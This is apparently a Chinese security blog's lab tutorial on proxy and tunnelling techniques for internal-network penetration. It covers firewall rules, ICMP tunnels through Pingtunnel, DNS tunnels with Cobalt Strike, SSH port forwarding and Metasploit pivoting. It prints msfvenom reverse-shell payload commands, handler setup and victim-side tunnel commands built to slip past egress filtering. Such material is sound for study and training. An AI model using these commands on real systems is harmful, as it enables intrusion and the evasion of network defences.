@@ -1,0 +1,286 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="云逸'bolg" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="云逸'bolg" type="application/atom+xml"><link rel="alternate" type="application/json" title="云逸'bolg" href="http://gyzero.shop/feed.json"/><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/><link rel="dns-prefetch" href="https://unpkg.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.3.6"><script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.js"></script><link rel="canonical" href="http://gyzero.shop/2022/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/"><title>隧道代理</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">隧道代理</h1><div class="meta"><span class="item" title="创建时间：2022-11-12 17:10:18"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2022-11-12T17:10:18+08:00">2022-11-12</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>20k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>18 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">云逸'bolg</a></li></ul><ul class="right" id="rightNav"><li class="item theme" @click="changeThemeByBtn"><i class="ic" :class="{'i-sun': !themeStatus,'i-moon': themeStatus}"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/hg.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/oo.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%A3%81%E7%BA%B8/52.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/00.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/8888.jpg"></li><li class="item" data-background-image="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%A3%81%E7%BA%B8/45.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/network-security/" itemprop="item" rel="index" title="分类于网络安全"><span itemprop="name">网络安全<meta itemprop="position" content="0"/></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/network-security/neiwang/" itemprop="item" rel="index" title="分类于内网安全"><span itemprop="name">内网安全<meta itemprop="position" content="1"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://gyzero.shop/2022/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="云逸"/><meta itemprop="description" content=", "/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="云逸'bolg"/></span><div class="body md" itemprop="articleBody"><p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316173022003.png" alt="image-20240316173022003"></p>
+<h3 id="代理技术"><a class="markdownIt-Anchor" href="#代理技术">#</a> 代理技术</h3>
+<p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端 “中间人” 的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。简单来说，代理技术解决的是网络之间的通信问题，如内网与外网之间或者两者自己之间的通信，两个不同内网的通信就必须借助到代理，否则无法通讯。</p>
+<p>图中两台内网中的主机是无法直接通信的，但是两台主机可以与公网的 vps 通信在公网 vps 上做代理转发把两台主机的流量转发给双方</p>
+<ol>
+<li><strong>建立连接</strong>：首先，两台内网主机分别与公网 VPS 建立连接。这通常可以通过 SSH 或其他网络协议实现。</li>
+<li><strong>设置代理</strong>：在公网 VPS 上设置代理服务器，用于接收来自两台内网主机的请求，并将请求转发给另一台主机。</li>
+<li><strong>数据转发</strong>：当一台内网主机发送数据时，数据首先被发送到公网 VPS，然后由 VPS 将数据转发给另一台内网主机。</li>
+</ol>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315195904305.png" alt="image-20240315195904305"></p>
+<h3 id="隧道技术"><a class="markdownIt-Anchor" href="#隧道技术">#</a> 隧道技术</h3>
+<p>隧道技术是一种网络通信策略，它允许不同网络的设备通过互联网进行安全的交流。简单来说，隧道技术解决了在网络通信中遇到的阻碍问题，例如绕过防火墙的过滤、处理网络连接和通讯问题，以及处理数据回链封装问题。有时候，我们发送的数据流量可能会被拦截，这时就需要利用隧道技术来绕过这种阻碍。隧道技术通过采用不同的协议，将本来无法通行的通信路径打通。在进入内部网络后，有些协议可能会被拦截，导致我们无法接收到目标设备的流量。这时，可以借助一些特殊的协议来建立隧道，以重新实现通信。</p>
+<p>图中两台主机在同一个内网可以通信的，但是防火墙禁止了一些协议导致通过这些走的流量会被拦截导致无法通信，这时候就可以使用例如 icmp 等重新搭建一条路让流量走这里进行通信，但是不可以使用 http 因为 http 协议是基于 tcp 的</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316164019233.png" alt="image-20240316164019233"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316171226537.png" alt="image-20240316171226537"></p>
+<h4 id="协议出网判断"><a class="markdownIt-Anchor" href="#协议出网判断">#</a> 协议出网判断</h4>
+<p>ICMP:ping 命令</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240422140551020.png" alt="image-20240422140551020"></p>
+<p>DNS 协议：nslookup</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240422140907905.png" alt="image-20240422140907905"></p>
+<p>SSH 隧道：ssh:root@192.168.0.123 22 端口</p>
+<h4 id="关于正反shell"><a class="markdownIt-Anchor" href="#关于正反shell">#</a> 关于正反 shell</h4>
+<p>什么是正向 shell 反向 shell</p>
+<p>正向就是攻击机主动去连接绑定的受害机的端口</p>
+<p>反向就是让受害机主动来连接攻击机的指定端口</p>
+<p>一般来讲对于防火墙入站规则是比出站规则严格的多，端口过滤的会很严格除非有没有被过滤且没有被占用的端口，这时就可以使用反弹 shell 进行上线，如果防火墙禁止了 TCP 出站，那么就需要使用其他协议来搭建隧道。</p>
+<h3 id="防火墙出入站规则"><a class="markdownIt-Anchor" href="#防火墙出入站规则">#</a> 防火墙出入站规则</h3>
+<p>防火墙上有出站和入站规则</p>
+<p>出站规则就是本机去访问外网</p>
+<p>例如一些软件需要去访问互联网上的资源</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203256799.png" alt="image-20240315203256799"></p>
+<p>入站就是比如当前主机是一台 web 服务器用户来访问服务器上的网站</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203441398.png" alt="image-20240315203441398"></p>
+<p>Windows 防火墙提供了三种网络配置文件：域、专用和公用</p>
+<ol>
+<li><strong>域</strong>：当设备已加入 Active Directory 域，并且可以访问域控制器时，会自动应用域网络配置文件这种网络位置类型无法手动设置</li>
+<li><strong>专用</strong>：专用网络配置文件主要用于专用网络，如家庭网络或办公室网络管理员可以在网络接口上手动设置它</li>
+<li><strong>公用</strong>：公用网络配置文件主要用于公共网络，如公共 Wi-Fi 网络或其他共享网络这是身份不明网络的默认配置文件</li>
+</ol>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203842956.png" alt="image-20240315203842956"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203816409.png" alt="image-20240315203816409"></p>
+<h4 id="防火墙添加规则"><a class="markdownIt-Anchor" href="#防火墙添加规则">#</a> 防火墙添加规则</h4>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315204831486.png" alt="image-20240315204831486"></p>
+<p>程序设置就是电脑里的一些软件</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315213822274.png" alt="image-20240315213822274"></p>
+<p>指定的端口例如 80 端口 http，22ssh</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214021610.png" alt="image-20240315214021610"></p>
+<p>自定义可以设置的更详细些</p>
+<p>比如可以规定那些协议可以通过，应用于指定的 ip</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214227534.png" alt="image-20240315214227534"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214336145.png" alt="image-20240315214336145"></p>
+<p>当前主机有一个 web 服务 80 端口 http, 不想让别人访问到就可以设置入站规则</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214551009.png" alt="image-20240315214551009"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214620069.png" alt="image-20240315214620069"></p>
+<p>规则开启时无法访问</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214721993.png" alt="image-20240315214721993"></p>
+<p>规则关闭时则正常访问</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214830260.png" alt="image-20240315214830260"></p>
+<h4 id="命令行设置防火墙"><a class="markdownIt-Anchor" href="#命令行设置防火墙">#</a> 命令行设置防火墙</h4>
+<pre><code class="language-cmd">netsh advfirewall show currentprofile #查看防火墙状态
+netsh advfirewall set allprofiles state on #开启防火墙
+netsh advfirewall set allprofiles state off #关闭防火墙
+netsh advfirewall firewall add rule name=&quot;80off&quot; dir=in action=block protocol=TCP localport=80 #禁止访问本地TCP协议80端口
+netsh advfirewall firewall add rule name=&quot;80on&quot; dir=in action=allow protocol=TCP localport=80 #允许访问本地TCP协议80
+netsh advfirewall firewall delete rule name=&quot;80off&quot; #删除名为80off的规则
+netsh advfirewall firewall show rule name=&quot;http&quot; #查看名为http的防火墙规则
+netsh advfirewall firewall add rule name=&quot;22&quot; dir=in protocol=tcp localport=22 action=block
+#阻止所有进入的 TCP 流量通过端口 22。
+netsh advfirewall firewall add rule name=&quot;22on&quot; dir=in protocol=tcp localport=22 action=allow
+#允许所有进入的 TCP 流量通过端口 22。
+https://learn.microsoft.com/zh-cn/windows/security/operating-system-security/network-security/windows-firewall/rules#官方文档
+</code></pre>
+<h4 id="域组策略控制防火墙"><a class="markdownIt-Anchor" href="#域组策略控制防火墙">#</a> 域组策略控制防火墙</h4>
+<p>在一个域环境中，域控制器（Domain Controller）可以通过组策略（Group Policy）来管理和同步其下属主机的防火墙规则。这样，管理员就可以集中地管理网络环境中所有计算机的防火墙设置，而不需要在每台计算机上单独进行配置。</p>
+<p>管理员可以在域控制器上创建和配置组策略对象（Group Policy Object，GPO），然后将这些 GPO 应用到一个或多个组织单位（Organizational Unit，OU）上。这些 OU 中的计算机将会自动接收并应用这些 GPO 中的设置，包括防火墙规则。</p>
+<p>在域控组策略新建 GPO</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316152809739.png" alt="image-20240316152809739"></p>
+<p>右键编辑打开策略里的防火墙设置</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153009887.png" alt="image-20240316153009887"></p>
+<p>在另一台域内主机防火墙是关闭的</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153127674.png" alt="image-20240316153127674"></p>
+<p>在域控这里设置防火墙属性把域防火墙设置为启动</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153220403.png" alt="image-20240316153220403"></p>
+<p>右键点击强制会立刻启用该策略，或者使用 gpupdate/force 更新策略，或者主机重启后生效</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153403952.png" alt="image-20240316153403952"></p>
+<p>这时域控下属主机防火墙开启并且不可自己关闭必须由管理员设置</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316155150999.png" alt="image-20240316155150999"></p>
+<p>当然设置的防火墙规则也会同步下发到下属主机例如禁止 80 端口入站</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316155851138.png" alt="image-20240316155851138"></p>
+<h3 id="icmp隧道"><a class="markdownIt-Anchor" href="#icmp隧道">#</a> ICMP 隧道</h3>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316173544717.png" alt="image-20240316173544717"></p>
+<p>将 TCP 协议封装成 ICMP 协议</p>
+<p>常见工具 Pingtunnel,icmpsh,spp</p>
+<h4 id="pingtunnel"><a class="markdownIt-Anchor" href="#pingtunnel">#</a> Pingtunnel</h4>
+<p><code>https://github.com/esrrhs/pingtunnel</code></p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>kali:</pre></td></tr><tr><td data-num="2"></td><td><pre>msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4343</span> <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> msf.exe </pre></td></tr><tr><td data-num="3"></td><td><pre>use exploit/multi/handler</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">set</span> lhost <span class="token number">0.0</span>.0.0</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token builtin class-name">set</span> lport <span class="token number">9999</span></pre></td></tr><tr><td data-num="7"></td><td><pre>run</pre></td></tr><tr><td data-num="8"></td><td><pre>klai使用./pingtunnel <span class="token parameter variable">-type</span> server 开启隧道</pre></td></tr><tr><td data-num="9"></td><td><pre>受害机:</pre></td></tr><tr><td data-num="10"></td><td><pre>pingtunnel.exe <span class="token parameter variable">-type</span> client <span class="token parameter variable">-l</span> :6666 <span class="token parameter variable">-s</span> <span class="token number">10.10</span>.10.130 <span class="token parameter variable">-t</span> <span class="token number">10.10</span>.10.130:8888 <span class="token parameter variable">-tcp</span> <span class="token number">1</span> <span class="token parameter variable">-noprint</span> <span class="token number">1</span> <span class="token parameter variable">-nolog</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="11"></td><td><pre>运行msf.exe</pre></td></tr></table></figure><p>首先生成木马受害机运行后会将流量转发到 127.0.0.1 的 4343 也就是受害机的 4343 端口但是因为木马是 tcp 流量被限制了出不了站这时候用 <code>Pingtunnel</code>  把 4343 端口的走 <code>tcp</code>  的流量封装成 <code>icmp</code>  协议的流量转到 kali 的 9999 端口，然后我们 kali 上面使用 <code>Pingtunnel</code>  开启隧道，并监听 9999 端口这样我们就可以正常接收到流量绕过防火墙限制了</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325172437953.png" alt="image-20240325172437953"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325164605444.png" alt="image-20240325164605444"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325170434411.png" alt="image-20240325170434411"></p>
+<p>CS 测试</p>
+<p>首先建立两个监听</p>
+<p>p1 为 10.10.10.130 端口 9898</p>
+<p>p2 为 127.0.0.1 端口 6666</p>
+<p>生成木马用 p2 生成，这样受害机器执行木马会将流量转发到本地的 6666 端口</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151229404.png" alt="image-20240328151229404"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151611542.png" alt="image-20240328151611542"></p>
+<p>受害机:<br>
+pingtunnel.exe -type client -l :6666 -s 192.168.0.145 -t 192.168.0.104:8888 -tcp 1 -noprint 1 -nolog 1</p>
+<p>将 6666 端口流量封装成 icmp 转发到 kali 的 9898 端口</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328152102020.png" alt="image-20240328152102020"></p>
+<p>kali 启动隧道</p>
+<p>./pingtunnel -type server</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328152134631.png" alt="image-20240328152134631"></p>
+<p>cs 成功上线</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151958141.png" alt="image-20240328151958141"></p>
+<h3 id="dns隧道搭建"><a class="markdownIt-Anchor" href="#dns隧道搭建">#</a> DNS 隧道搭建</h3>
+<p>准备一个域名</p>
+<p>要添加两条记录分别是 A 记录和 NS 记录</p>
+<p>A 记录指向我们的 vps 服务器</p>
+<p><span class="exturl" data-url="aHR0cDovL3huLS1OU3MtcXQ5ZGo5bGhhNTI2YXIzM2FqeGFnNnMzc2F2M2VqODFpejY1Yy54eHgueHh4">NS 记录指向刚才我们创建的 s.xxx.xxx</span></p>
+<p><span class="exturl" data-url="aHR0cDovL3huLS1jc2RuczEtY3A3aTkzZDR3djhhMjU5NmFxb2M2NW4yNTRiN21tbm0xYi54eHgueHh4">然后我们用 cs 上线时指向 dns1.xxx.xxx</span>，<span class="exturl" data-url="aHR0cDovL3huLS1zLTd6NmFtaXk2aTIzcWN0cW52MGQueHh4Lnh4eA==">他就会解析到 s.xxx.xxx</span>，接着 s.xxx.xxx 解析到我们的 vps 地址隧道搭建完成了就</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426164655935.png" alt="image-20240426164655935"></p>
+<p>**NS 记录，全称为 Name Server 记录，是用于指定域名应该由哪些 DNS 服务器进行解析的记录。** 它告诉互联网上的其他 DNS 服务器，当有查询请求到达时，应该将请求重定向到哪些 DNS 服务器上。</p>
+<p>接着 cs 创建 DNS 监听</p>
+<p><span class="exturl" data-url="aHR0cDovL3huLS1kbnMxLTR6OGY0OTBhaGQueHh4LnhuLS14eHhzLTIyMWcueHh4Lnh4eA==">地址写 dns1.xxx.xxx 和 s.xxx.xxx</span></p>
+<p>dns1 解析解析到 s. 接着再解析成 vps 地址</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426165506171.png" alt="image-20240426165506171"></p>
+<p>接着生成木马执行后内网主机即可上线</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426170240575.png" alt="image-20240426170240575"></p>
+<p>接着执行 mode dns-txt</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426170944198.png" alt="image-20240426170944198"></p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426171142913.png" alt="image-20240426171142913"></p>
+<h3 id="ssh隧道搭建"><a class="markdownIt-Anchor" href="#ssh隧道搭建">#</a> SSH 隧道搭建</h3>
+<p>SSH 隧道（SSH Tunneling）是一种利用 SSH 协议为其他协议或网络连接提供安全加密的方法。它通过在 SSH 连接中创建加密通道，可以安全地传输未加密的网络流量，并将其转发到目标目的地，确保数据传输的私密性和安全性。SSH 隧道通常用于加密和保护从本地计算机到远程服务器的通信。</p>
+<p>主要的 SSH 隧道类型包括：</p>
+<ol>
+<li>本地端口转发（Local Port Forwarding）：将本地计算机的指定端口的流量通过 SSH 连接转发到远程服务器，并由远程服务器将流量转发到目标服务器。这种方式使得本地计算机可以通过 SSH 连接安全地访问目标服务器提供的服务。</li>
+<li>远程端口转发（Remote Port Forwarding）：将远程服务器上的指定端口的流量通过 SSH 连接转发到本地计算机，并由本地计算机将流量转发到目标服务器。这种方式允许远程服务器上的服务通过 SSH 连接安全地访问本地计算机上的服务。</li>
+<li>动态端口转发（Dynamic Port Forwarding）：创建一个本地的 SOCKS 代理服务器，应用程序可以通过配置使用这个 SOCKS 代理，而 SSH 客户端则负责将流量通过 SSH 连接转发出去。这种方式可以用于将本地计算机的所有流量通过 SSH 连接转发到远程服务器，从而实现全局的网络流量加密和安全访问。</li>
+</ol>
+<p>网络环境为</p>
+<p>vps 不可和内网主机访问</p>
+<p>kali 与 web 可通信</p>
+<p>web 内网主机 80 端口</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>远程端口转发 可用于入站被封</pre></td></tr><tr><td data-num="2"></td><td><pre>在kali运行:</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">ssh</span> <span class="token parameter variable">-CfNg</span> <span class="token parameter variable">-R</span> <span class="token number">9999</span>:192.168.0.107:80 root@vpsIP</pre></td></tr><tr><td data-num="4"></td><td><pre>这条命令表示将web主机的80端口流量通过本机转发给我们vps的9999端口上</pre></td></tr><tr><td data-num="5"></td><td><pre>-C：请求压缩所有数据</pre></td></tr><tr><td data-num="6"></td><td><pre>-f：后台执行ssh指令</pre></td></tr><tr><td data-num="7"></td><td><pre>-N：不执行远程指令</pre></td></tr><tr><td data-num="8"></td><td><pre>-g：允许远程主机连接主机的转发端口</pre></td></tr></table></figure><p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501173707184.png" alt="image-20240501173707184"></p>
+<p>vps 即可访问 web 的网站</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501173102203.png" alt="image-20240501173102203"></p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>本地端口转发 可用于出站被封</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">ssh</span> <span class="token parameter variable">-CfNg</span> <span class="token parameter variable">-L</span> <span class="token number">8888</span>:192.168.0.107:80 root@192.168.0.105</pre></td></tr><tr><td data-num="3"></td><td><pre>将web主机的80端口流量转到本机kali的8888端口上</pre></td></tr></table></figure><p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501181131671.png" alt="image-20240501181131671"></p>
+<h3 id="代理实验"><a class="markdownIt-Anchor" href="#代理实验">#</a> 代理实验</h3>
+<p>网络环境为</p>
+<p>win10 192.168.0.146 vm2<br>
+server4 192.168.0.145 10.10.10.134 vm2 vm19<br>
+web net 10.10.10.137 vm19  192.169.139.120 可出网<br>
+ vps 公网</p>
+<p>拿到 web 主机后用他来当作跳板去渗透剩下两台主机，操作在 kali 通过 web 主机进行传输，因为 12server 是不出网的我们无法直接访问但是他是可以跟 web 主机通信的这样就可以在 web 主机上做代理把它当作跳板机和 12server 通信做渗透</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401211546933.png" alt="image-20240401211546933"></p>
+<h4 id="msf代理测试"><a class="markdownIt-Anchor" href="#msf代理测试">#</a> msf 代理测试</h4>
+<p>首先生成木马获取 web 主机</p>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=8888 LHOST=192.168.139.194 -f exe -o 555.exe</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240331172619806.png" alt="image-20240331172619806"></p>
+<p>接着 msf 添加路由</p>
+<p>run post/multi/manage/autoroute</p>
+<p>run autoroute -p</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401211151335.png" alt="image-20240401211151335"></p>
+<p>接着用到 <code>use auxiliary/server/socks_proxy</code>  socks 代理模块开启 socks 代理</p>
+<p>设置好配置运行</p>
+<p><img data-src="https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401191609467.png" alt="image-20240401191609467"></p>
+<p>此时我们用本地的主机访问 12server10 网段的的网站是访问不到的，下载 sockscap64 软件</p>
